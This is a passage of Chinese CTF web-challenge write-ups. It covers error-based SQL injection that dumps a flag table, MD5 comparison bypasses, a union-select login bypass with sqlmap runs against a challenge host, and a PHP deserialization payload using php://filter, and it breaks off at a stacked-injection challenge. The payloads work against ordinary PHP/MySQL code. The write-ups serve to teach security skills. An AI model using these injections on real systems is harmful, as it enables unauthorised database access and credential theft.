<span class="hljs-attribute">and</span> (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select user()),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e)))   //两个参数</code></pre>
<p>爆库名：</p>
<pre><code class="hljs sql">check.php?username=1&amp;password=&#x27;^(updatexml(1,concat(0x7e,(<span class="hljs-keyword">SELECT</span>(@@<span class="hljs-keyword">version</span>)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>
XPATH syntax <span class="hljs-keyword">error</span>: <span class="hljs-string">&#x27;~10.3.18-MariaDB~&#x27;</span>

check.php?username=<span class="hljs-number">1</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-string">&#x27;^(updatexml(1,concat(0x7e,(SELECT(database())),0x7e),1))%23</span>
<span class="hljs-string">或1&#x27;</span>^extractvalue(<span class="hljs-number">0x0a</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">database</span>()))))%<span class="hljs-number">23</span>
XPATH syntax <span class="hljs-keyword">error</span>: <span class="hljs-string">&#x27;~geek~&#x27;</span></code></pre>
<p>爆表名：【注意select后一大串都需要括起来】</p>
<pre><code class="hljs apache"><span class="hljs-attribute">username</span>=<span class="hljs-number">1</span>&amp;password=<span class="hljs-number">1</span>&#x27;^extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;))))%<span class="hljs-number">23</span>

<span class="hljs-attribute">XPATH</span> syntax error: &#x27;~H<span class="hljs-number">4</span>rDsq<span class="hljs-number">1</span>&#x27;</code></pre>
<p>爆列名：</p>
<pre><code class="hljs sql">username=1&amp;password=1&#x27;^extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(column_name))<span class="hljs-keyword">from</span>(information_schema.columns)<span class="hljs-keyword">where</span>(table_schema)<span class="hljs-keyword">like</span>(<span class="hljs-string">&#x27;geek&#x27;</span>))))%<span class="hljs-number">23</span>

XPATH syntax <span class="hljs-keyword">error</span>: <span class="hljs-string">&#x27;~id,username,password&#x27;</span></code></pre>
<p>爆字段：</p>
<pre><code class="hljs apache"><span class="hljs-attribute">username</span>=<span class="hljs-number">1</span>&amp;password=<span class="hljs-number">1</span>&#x27;^extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select(group_concat(id,username,password))from(H<span class="hljs-number">4</span>rDsq<span class="hljs-number">1</span>))))%<span class="hljs-number">23</span>

<span class="hljs-attribute">XPATH</span> syntax error: &#x27;~<span class="hljs-number">1</span>flagflag&#123;<span class="hljs-number">1</span>f<span class="hljs-number">077763</span>-bd<span class="hljs-number">8</span>b-<span class="hljs-number">4</span>ef<span class="hljs-number">1</span>-<span class="hljs-number">92</span>&#x27;

<span class="hljs-attribute">extractvalue</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select(group_concat(password))from(H<span class="hljs-number">4</span>rDsq<span class="hljs-number">1</span>))))%<span class="hljs-number">23</span>  //还是只回显一半，==》
<span class="hljs-attribute">XPATH</span> syntax error: &#x27;~flag&#123;<span class="hljs-number">1</span>f<span class="hljs-number">077763</span>-bd<span class="hljs-number">8</span>b-<span class="hljs-number">4</span>ef<span class="hljs-number">1</span>-<span class="hljs-number">92</span>d<span class="hljs-number">9</span>-<span class="hljs-number">01</span>&#x27;</code></pre>
<p><strong>extractvalue()和updatexml()</strong>只能回显==32位长度==的数据</p>
<p><strong>extractvalue()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substring()函数截取，一次查看32位</strong></p>
<h4 id="截取部分长度字符串函数">截取部分长度字符串函数：</h4>
<table>
<colgroup>
<col style="width: 34%">
<col style="width: 65%">
</colgroup>
<thead>
<tr class="header">
<th>lefft(str,len)</th>
<th>对指定字符串从最左边截取指定长度。</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>right(str,len)</td>
<td>对指定字符串从<strong>最右边</strong>截取指定长度</td>
</tr>
<tr class="even">
<td>substr(str,N_start,N_length)</td>
<td>对指定字符串进行截取，为SUBSTRING的简单版。</td>
</tr>
<tr class="odd">
<td>mid(column_name,start[,length])</td>
<td>str="123456" mid(str,2,1) 结果为2【类似string、substr】</td>
</tr>
</tbody>
</table>
<pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;^extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select(right(password,<span class="hljs-number">15</span>))from(H<span class="hljs-number">4</span>rDsq<span class="hljs-number">1</span>))))%<span class="hljs-number">23</span>

<span class="hljs-attribute">XPATH</span> syntax error: &#x27;~<span class="hljs-number">9</span>-<span class="hljs-number">01</span>edbdbb<span class="hljs-number">1804</span>&#125;&#x27;</code></pre>
<p>拼接得到完整flag</p>
<h2 id="mrctf2020ez_bypass容易">[MRCTF2020]Ez_bypass（容易）</h2>
<h4 id="考点md5强比较绕过弱比较">考点：md5强比较绕过、弱比较</h4>
<pre><code class="hljs php">I put something in F12 <span class="hljs-keyword">for</span> you
<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;
$flag=<span class="hljs-string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;
    $id=$_GET[<span class="hljs-string">&#x27;id&#x27;</span>];
    $gg=$_GET[<span class="hljs-string">&#x27;gg&#x27;</span>];
    <span class="hljs-keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;   <span class="hljs-comment">//❗强等于，数组绕过即可</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;
        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;
            $passwd=$_POST[<span class="hljs-string">&#x27;passwd&#x27;</span>];
            <span class="hljs-keyword">if</span> (!is_numeric($passwd))
            &#123;
                 <span class="hljs-keyword">if</span>($passwd==<span class="hljs-number">1234567</span>)   <span class="hljs-comment">//passwd=1234567a即可绕过</span>
                 &#123;
                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>;
                     highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);   <span class="hljs-comment">//❗</span>
                     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Retr_0&#x27;</span>);
                 &#125;
                 <span class="hljs-keyword">else</span>
                 &#123;
                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;can you think twice??&quot;</span>;
                 &#125;
            &#125;
            <span class="hljs-keyword">else</span>&#123;
                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You can not get it !&#x27;</span>;
            &#125;
        &#125;
        <span class="hljs-keyword">else</span>&#123;
            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;only one way to get the flag&#x27;</span>);  <span class="hljs-comment">//passwd没赋值的情况</span>
        &#125;
&#125;
    <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not a real hacker!&quot;</span>;
    &#125;
&#125;
<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Please input first&#x27;</span>);
&#125;
&#125;Please input first</code></pre>
<p>md5比较：</p>
<p>但是，强比较（===）不仅比较值，还比较类型，0e此时被当作字符串，所以不能用0e来进行绕过碰撞，只能用数组绕过，or
，找两个值不同但MD5相同的</p>
<pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">md5</span>(<span class="hljs-title">array</span>()) = <span class="hljs-variable"><span class="hljs-literal">null</span></span></span></code></pre>
<p>payload：</p>
<pre><code class="hljs angelscript">?gg[]=<span class="hljs-number">1</span>&amp;id[]=<span class="hljs-number">2</span>
passwd=<span class="hljs-number">1234567</span>a</code></pre>
<h2 id="gxyctf2019babysqli">[GXYCTF2019]BabySQli（*）</h2>
<h4 id="考点手工联合查询不存在数据构造虚拟数据绕过md5密码验证">考点：手工+联合查询不存在数据构造虚拟数据绕过md5密码验证</h4>
<p>关键点：对orderby后并不回显123而是验证用户名/密码正确与否，——绕过密码的md5验证：需要把我们输入的值和数据库里面存放的用户密码的md5值进行比较，<strong>可以用联合查询语句用来生成虚拟的表数据覆盖原用户admin绕过</strong></p>
<p>点进去是登录框，然后name有注入点而pw没有！</p>
<p>sqlmap跑：发现是延时注入</p>
<pre><code class="hljs apache"><span class="hljs-attribute">sqlmap</span> -u http://f<span class="hljs-number">41</span>e<span class="hljs-number">9833</span>-<span class="hljs-number">9</span>c<span class="hljs-number">93</span>-<span class="hljs-number">4</span>b<span class="hljs-number">72</span>-bb<span class="hljs-number">87</span>-<span class="hljs-number">09</span>fdedf<span class="hljs-number">1</span>b<span class="hljs-number">5</span>d<span class="hljs-number">7</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/index.php --forms</code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309120711794.png" srcset="/img/loading.gif" alt="image-20220309120711794" style="zoom:67%;"></p>
<p>跑库名 ：</p>
<pre><code class="hljs apache"><span class="hljs-attribute">sqlmap</span> -u http://f<span class="hljs-number">41</span>e<span class="hljs-number">9833</span>-<span class="hljs-number">9</span>c<span class="hljs-number">93</span>-<span class="hljs-number">4</span>b<span class="hljs-number">72</span>-bb<span class="hljs-number">87</span>-<span class="hljs-number">09</span>fdedf<span class="hljs-number">1</span>b<span class="hljs-number">5</span>d<span class="hljs-number">7</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/index.php --current-db --forms
<span class="hljs-attribute">web_sqli</span></code></pre>
<p>跑表名：</p>
<pre><code class="hljs apache"><span class="hljs-attribute">sqlmap</span> -u http://f<span class="hljs-number">41</span>e<span class="hljs-number">9833</span>-<span class="hljs-number">9</span>c<span class="hljs-number">93</span>-<span class="hljs-number">4</span>b<span class="hljs-number">72</span>-bb<span class="hljs-number">87</span>-<span class="hljs-number">09</span>fdedf<span class="hljs-number">1</span>b<span class="hljs-number">5</span>d<span class="hljs-number">7</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/index.php -D web_sqli --tables --forms
<span class="hljs-attribute">user</span></code></pre>
<p>爆数据</p>
<pre><code class="hljs apache"><span class="hljs-attribute">sqlmap</span> -u http://f<span class="hljs-number">41</span>e<span class="hljs-number">9833</span>-<span class="hljs-number">9</span>c<span class="hljs-number">93</span>-<span class="hljs-number">4</span>b<span class="hljs-number">72</span>-bb<span class="hljs-number">87</span>-<span class="hljs-number">09</span>fdedf<span class="hljs-number">1</span>b<span class="hljs-number">5</span>d<span class="hljs-number">7</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/index.php -D web_sqli -T user --dump --forms -C id
<span class="hljs-attribute">1</span>
<span class="hljs-attribute">sqlmap</span> -u http://f<span class="hljs-number">41</span>e<span class="hljs-number">9833</span>-<span class="hljs-number">9</span>c<span class="hljs-number">93</span>-<span class="hljs-number">4</span>b<span class="hljs-number">72</span>-bb<span class="hljs-number">87</span>-<span class="hljs-number">09</span>fdedf<span class="hljs-number">1</span>b<span class="hljs-number">5</span>d<span class="hljs-number">7</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/index.php -D web_sqli -T user --dump --forms -C username
<span class="hljs-attribute">admin</span>
<span class="hljs-attribute">sqlmap</span> -u http://f<span class="hljs-number">41</span>e<span class="hljs-number">9833</span>-<span class="hljs-number">9</span>c<span class="hljs-number">93</span>-<span class="hljs-number">4</span>b<span class="hljs-number">72</span>-bb<span class="hljs-number">87</span>-<span class="hljs-number">09</span>fdedf<span class="hljs-number">1</span>b<span class="hljs-number">5</span>d<span class="hljs-number">7</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/index.php -D web_sqli -T user --dump --forms -C passwd
<span class="hljs-attribute">cdc9c819c7f8be2628d4180669009d28</span></code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309121646850.png" srcset="/img/loading.gif" alt="image-20220309121646850" style="zoom:67%;"></p>
<p>但是登录不上去，密码尝试md5破解也不行，base32加密再base64加密也不行【后续手工发现是hash了，但是没有告知盐，所以这里密码不能破解】</p>
<p>手工：</p>
<p>提交数据后跳转到search.php，源码看到注释提示，base64/md5都解不出来，一键解码工具</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309122020599.png" srcset="/img/loading.gif" alt="image-20220309122020599" style="zoom:80%;"></p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309122033327.png" srcset="/img/loading.gif" alt="image-20220309122033327" style="zoom: 67%;"></p>
<p>解出SQL语句</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309122102792.png" srcset="/img/loading.gif" alt="image-20220309122102792" style="zoom:67%;"></p>
<pre><code class="hljs routeros">select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> user </span>where username = <span class="hljs-string">&#x27;$name&#x27;</span></code></pre>
<p>看来真是name存在注入</p>
<p>order被过滤：大小写字母就能绕过</p>
<pre><code class="hljs routeros"><span class="hljs-attribute">name</span>=1&#x27;Order by 3#&amp;<span class="hljs-attribute">pw</span>=2  ——wrong user!
<span class="hljs-attribute">name</span>=1&#x27;Order by 4#&amp;<span class="hljs-attribute">pw</span>=2  ——Error: Unknown column <span class="hljs-string">&#x27;4&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;order clause&#x27;</span>——3列数据</code></pre>
<p>然后<code>name=-'union select 1,2,3#&amp;pw=2</code>发现回显<strong>wrong
user!</strong></p>
<p>而<code>name=-'union select 1,'admin',3#&amp;pw=2</code>回显wrong
pass</p>
<p><strong>那么就是先查询，查询不到数据则 ’ worry
user’,再用查询出来的数据对比password，对比不符合则 ’ worry pass
’</strong></p>
<p>但当我们是测试admin用户时却回显wrong
pass!(密码错误)，很明显这里绝对存在admin这个账号。此时，我们的思路就是登上admin用户或者得到admin的密码，但是密码是经过hash运算的，怎么得知/解密呢？</p>
<h4 id="新知识点虚拟数据">新知识点：虚拟数据</h4>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/107167452">参考WP</a></p>
</blockquote>
<p> <strong>当查询的数据不存在的时候，联合查询就会构造一个虚拟的数据</strong></p>
<p>举个例子：如果users表中只有一行数据，我们通过union
select查询就可以构造一行虚拟的数据，</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/20200706211115507.png" srcset="/img/loading.gif" style="zoom:80%;"></p>
<p><strong>那么我们的思路就来了，我们可以利用联合查询来创建一行admin账户的续集数据，混淆admin用户的密码，将我们自定义的admin用户的密码（123）加进去，这样我们不就可以登录admin用户了吗。</strong></p>
<p>看到源码</p>
<pre><code class="hljs php">mysqli_query($con,<span class="hljs-string">&#x27;SET NAMES UTF8&#x27;</span>);
$name = $_POST[<span class="hljs-string">&#x27;name&#x27;</span>];
$password = $_POST[<span class="hljs-string">&#x27;pw&#x27;</span>];
$t_pw = md5($password);
$sql = <span class="hljs-string">&quot;select * from user where username = &#x27;&quot;</span>.$name.<span class="hljs-string">&quot;&#x27;&quot;</span>;
<span class="hljs-comment">// echo $sql;</span>
$result = mysqli_query($con, $sql);
<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\(|\)|\=|or/&quot;</span>, $name))&#123;
	<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;do not hack me!&quot;</span>);
&#125;
<span class="hljs-keyword">else</span>&#123;
	<span class="hljs-keyword">if</span> (!$result) &#123;
		printf(<span class="hljs-string">&quot;Error: %s\n&quot;</span>, mysqli_error($con));
		<span class="hljs-keyword">exit</span>();
	&#125;
	<span class="hljs-keyword">else</span>&#123;
		<span class="hljs-comment">// echo &#x27;&lt;pre&gt;&#x27;;</span>
		$arr = mysqli_fetch_row($result);
		<span class="hljs-comment">// print_r($arr);</span>
		<span class="hljs-keyword">if</span>($arr[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;admin&quot;</span>)&#123;    <span class="hljs-comment">//第二列数据要等于admin</span>
			<span class="hljs-keyword">if</span>(md5($password) == $arr[<span class="hljs-number">2</span>])&#123;   <span class="hljs-comment">//第三列数据要等与密码的MD5</span>
				<span class="hljs-keyword">echo</span> $flag;
			&#125;
			<span class="hljs-keyword">else</span>&#123;
				<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;wrong pass!&quot;</span>);
			&#125;
		&#125;
		<span class="hljs-keyword">else</span>&#123;
			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;wrong user!&quot;</span>);
		&#125;
	&#125;
&#125;</code></pre>
<p>payload:</p>
<pre><code class="hljs apache"><span class="hljs-attribute">123456</span>  md<span class="hljs-number">5</span>:e<span class="hljs-number">10</span>adc<span class="hljs-number">3949</span>ba<span class="hljs-number">59</span>abbe<span class="hljs-number">56</span>e<span class="hljs-number">057</span>f<span class="hljs-number">20</span>f<span class="hljs-number">883</span>e
<span class="hljs-attribute">name</span>=&#x27;union select <span class="hljs-number">1</span>,&#x27;admin&#x27;,&#x27;e<span class="hljs-number">10</span>adc<span class="hljs-number">3949</span>ba<span class="hljs-number">59</span>abbe<span class="hljs-number">56</span>e<span class="hljs-number">057</span>f<span class="hljs-number">20</span>f<span class="hljs-number">883</span>e&#x27;#&amp;pw=<span class="hljs-number">123456</span></code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309131226258.png" srcset="/img/loading.gif" alt="image-20220309131226258" style="zoom:67%;"></p>
<h2 id="网鼎杯-2020-青龙组areuserialz">[网鼎杯 2020
青龙组]AreUSerialz</h2>
<h4 id="考点反序列化构造伪协议绕过file_get_contents私有属性序列化后00被拦截">考点：反序列化构造、伪协议绕过file_get_contents、私有属性序列化后%00被拦截</h4>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);

highlight_file(<span class="hljs-keyword">__FILE__</span>);

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;

    <span class="hljs-keyword">protected</span> $op;
    <span class="hljs-keyword">protected</span> $filename;
    <span class="hljs-keyword">protected</span> $content;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;
        $op = <span class="hljs-string">&quot;1&quot;</span>;
        $filename = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;
        $content = <span class="hljs-string">&quot;Hello World!&quot;</span>;
        <span class="hljs-keyword">$this</span>-&gt;process();
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;
            <span class="hljs-keyword">$this</span>-&gt;write();
        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;
            $res = <span class="hljs-keyword">$this</span>-&gt;read();
            <span class="hljs-keyword">$this</span>-&gt;output($res);
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);
        &#125;
    &#125;

    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;content)) &#123;
            <span class="hljs-keyword">if</span>(strlen((<span class="hljs-keyword">string</span>)<span class="hljs-keyword">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;
                <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Too long!&quot;</span>);
                <span class="hljs-keyword">die</span>();
            &#125;
            $res = file_put_contents(<span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-keyword">$this</span>-&gt;content);
            <span class="hljs-keyword">if</span>($res) <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Successful!&quot;</span>);
            <span class="hljs-keyword">else</span> <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Failed!&quot;</span>);
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Failed!&quot;</span>);
        &#125;
    &#125;
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;
        $res = <span class="hljs-string">&quot;&quot;</span>;
        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;filename)) &#123;
            $res = file_get_contents(<span class="hljs-keyword">$this</span>-&gt;filename);
        &#125;
        <span class="hljs-keyword">return</span> $res;
    &#125;
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params">$s</span>) </span>&#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;
        <span class="hljs-keyword">echo</span> $s;
    &#125;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-comment">//4，要跳过写，直接读：op必须不满足===2，且满足==2</span>
        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>) 
            <span class="hljs-keyword">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;  
        <span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;
        <span class="hljs-keyword">$this</span>-&gt;process();
    &#125;

&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params">$s</span>) </span>&#123;    <span class="hljs-comment">//  2</span>
    <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; strlen($s); $i++)
        <span class="hljs-keyword">if</span>(!(ord($s[$i]) &gt;= <span class="hljs-number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="hljs-number">125</span>))   <span class="hljs-comment">//ord返回ASCII，21-125：可见字符</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
&#125;

<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;

    $str = (<span class="hljs-keyword">string</span>)$_GET[<span class="hljs-string">&#x27;str&#x27;</span>];  <span class="hljs-comment">//1</span>
    <span class="hljs-keyword">if</span>(is_valid($str)) &#123; 
        $obj = unserialize($str);  <span class="hljs-comment">//3</span>
    &#125;

&#125;</code></pre>
<p>整个流程：GET传参序列化字符串，满足ASCII有效后执行destruct函数，属性op不满足<code>===2</code>，满足<code>==2</code>，就会执行read函数，file_get_contents读取文件并返回结果</p>
<ol type="1">
<li>一开始没想到file_get_contents，直接读了flag.php，发现不对，才反应过来<strong>有file_get_contents</strong>==》利用伪协议php://filter，读源码</li>
<li>同时还要注意：==private属性序列化的时候格式是
%00类名%00成员名，自写脚本直接生成序列化字符串后还要手动加上%00==</li>
</ol>
<p>构造脚本：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;
    <span class="hljs-keyword">protected</span> $op=<span class="hljs-number">2</span>;
    <span class="hljs-keyword">protected</span> $filename=<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;
    <span class="hljs-keyword">protected</span> $content;
&#125;
$flag = <span class="hljs-keyword">new</span> FileHandler();
$flag_1 = serialize($flag);
<span class="hljs-keyword">echo</span> $flag_1;</code></pre>
<pre><code class="hljs less">再手动加上%<span class="hljs-selector-tag">00</span>
<span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:11</span><span class="hljs-selector-pseudo">:&quot;FileHandler&quot;</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;%00*%00op&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">2</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;%00*%00filename&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">52</span>:<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;%00*%00content&quot;</span>;<span class="hljs-selector-tag">N</span>;&#125;</code></pre>
<ol start="3" type="1">
<li><p>然后发现又不对，<strong>因为空字符的ASCII是0，不满足一开始的ASCII有效检验</strong>，就不会往后执行，反序列化</p>
<pre><code class="hljs aspectj"><span class="hljs-function">echo <span class="hljs-title">ord</span><span class="hljs-params">(<span class="hljs-string">&#x27;&#x27;</span>)</span></span>;   <span class="hljs-comment">//0</span></code></pre></li>
</ol>
<h4 id="如何绕过呢00">如何绕过呢%00？</h4>
<ul>
<li><strong>简单的一种是：php7.1+版本对属性类型不敏感，使用 public
修饰成员并序列化，反序列化后还是public——本地序列化的时候将属性改为public进行绕过即可</strong></li>
</ul>
<p>构造脚本：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;

    <span class="hljs-keyword">public</span> $op=<span class="hljs-number">2</span>;
    <span class="hljs-keyword">public</span> $filename=<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;
    <span class="hljs-keyword">public</span> $content;
&#125;
$flag = <span class="hljs-keyword">new</span> FileHandler();
$flag_1 = serialize($flag);
<span class="hljs-keyword">echo</span> $flag_1;</code></pre>
<pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;s:<span class="hljs-number">52</span>:<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;content&quot;</span>;N;&#125;</code></pre>
<p><span style="background:#FF9999;">注意</span>：一开始我用的op="2a"，发现不行，因为要<code>不满足===且满足=="2"</code>，这里满足的是<strong>弱等于字符串2，而不是数字2</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">&quot;2a&quot;</span>  ==  <span class="hljs-string">&quot;2&quot;</span>  x
<span class="hljs-attr">&quot;2a&quot;</span>  ==   <span class="hljs-number">2</span>   √
<span class="hljs-attr">&quot;2&quot;</span>   ==   <span class="hljs-number">2</span>   √</code></pre>
<p>然后成功读到flag.php的base64源码，解码得到flag</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312203106671.png" srcset="/img/loading.gif" alt="image-20220312203106671"></p>
<h2 id="gyctf2020blacklist">[GYCTF2020]Blacklist</h2>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/13681752.html">参考wp</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7169#toc-47">一些过滤技巧总结</a></p>
</blockquote>
<h4 id="考点堆叠注入类似强网杯handler代替select查询">考点：堆叠注入，类似强网杯、handler代替select查询</h4>
<p>万能密码，爆出3个内容</p>
<pre><code class="hljs lsl"><span class="hljs-number">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#</code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312212345118.png" srcset="/img/loading.gif" alt="image-20220312212345118" style="zoom:50%;"></p>
<p>查出来两个字段</p>
<pre><code class="hljs crmsh">?<span class="hljs-attr">inject=</span><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">2</span>--+</code></pre>
<p>黑名单：</p>
